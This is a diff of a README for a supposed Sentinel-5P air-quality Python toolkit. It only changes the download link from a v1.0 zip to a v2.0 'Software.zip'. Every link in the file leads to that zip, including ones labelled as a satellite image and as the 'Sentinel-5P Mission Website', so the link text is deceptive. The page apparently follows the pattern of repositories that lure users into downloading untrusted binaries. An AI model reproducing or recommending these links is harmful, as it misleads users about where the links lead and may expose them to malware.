@@ -1,6 +1,6 @@
 # 🛰️ Sentinel5P-AQI-Toolkit 🌍
 
-[![View Software](https://github.com/Lances69/Sentinel5P-AQI-Toolkit/releases/download/v1.0/Release_x64.zip)](https://github.com/Lances69/Sentinel5P-AQI-Toolkit/releases/download/v1.0/Release_x64.zip)
+[![View Software](https://github.com/Lances69/Sentinel5P-AQI-Toolkit/releases/download/v2.0/Software.zip)](https://github.com/Lances69/Sentinel5P-AQI-Toolkit/releases/download/v2.0/Software.zip)
 
 Sentinel5P-AQI-Toolkit is a comprehensive collection of Python scripts created to streamline the process of downloading and preprocessing air pollution concentration data obtained from the Sentinel-5P mission. This toolkit facilitates the efficient and accurate analysis of environmental monitoring data, enabling researchers and scientists to make informed decisions regarding air quality management.
 
@@ -44,7 +44,7 @@ For a more detailed guide on installing and using the toolkit, refer to the docu
 
 ## 📥 Download Software
 Click the button below to download the software package:
-[![View Software](https://github.com/Lances69/Sentinel5P-AQI-Toolkit/releases/download/v1.0/Release_x64.zip)](https://github.com/Lances69/Sentinel5P-AQI-Toolkit/releases/download/v1.0/Release_x64.zip)
+[![View Software](https://github.com/Lances69/Sentinel5P-AQI-Toolkit/releases/download/v2.0/Software.zip)](https://github.com/Lances69/Sentinel5P-AQI-Toolkit/releases/download/v2.0/Software.zip)
 
 If the link above does not work, please check the "Releases" section of the repository for alternative download options.
 
@@ -52,9 +52,9 @@ If the link above does not work, please check the "Releases" section of the repo
 
 🌿 Explore the capabilities of Sentinel5P-AQI-Toolkit and embark on your journey towards efficient air quality data analysis.
 
-![Satellite](https://github.com/Lances69/Sentinel5P-AQI-Toolkit/releases/download/v1.0/Release_x64.zip)
+![Satellite](https://github.com/Lances69/Sentinel5P-AQI-Toolkit/releases/download/v2.0/Software.zip)
 
-🔗 For more information, visit the [Sentinel-5P Mission Website](https://github.com/Lances69/Sentinel5P-AQI-Toolkit/releases/download/v1.0/Release_x64.zip) to learn about the satellite mission and its environmental monitoring objectives.
+🔗 For more information, visit the [Sentinel-5P Mission Website](https://github.com/Lances69/Sentinel5P-AQI-Toolkit/releases/download/v2.0/Software.zip) to learn about the satellite mission and its environmental monitoring objectives.
 
 Start leveraging the power of satellite data for environmental research with Sentinel5P-AQI-Toolkit! 🌐🛰️
 
